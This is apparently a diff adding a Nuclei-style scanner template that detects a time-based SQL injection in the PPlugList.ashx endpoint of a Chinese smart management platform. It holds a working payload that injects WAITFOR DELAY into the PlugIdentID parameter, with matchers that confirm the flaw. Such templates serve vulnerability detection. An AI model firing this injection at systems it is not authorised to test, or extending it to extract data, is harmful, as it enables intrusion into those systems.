@@ -1,0 +1,31 @@
+id: windor-ppluglist-sqli
+
+info:
+  name: Windor PPlugList - SQL Injection
+  author: qwtd
+  severity: high
+  classification:
+    cwe-id: CWE-89
+  description: |
+    银达汇智智慧综合管理平台的/Module/CJGL/Controller/PPlugList.ashx接口存在SQL注入漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库敏感信息。
+  reference:
+    - https://mp.weixin.qq.com/s/7OQc8S2aF3WN25qorfy9lA
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0PPlugList%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  tags: 福建银达-智慧综合管理平台
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/Module/CJGL/Controller/PPlugList.ashx?action=find&PlugIdentID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--'
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - '/error.html?aspxerrorpath=/Module/CJGL/Controller/PPlugList.ashx'
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
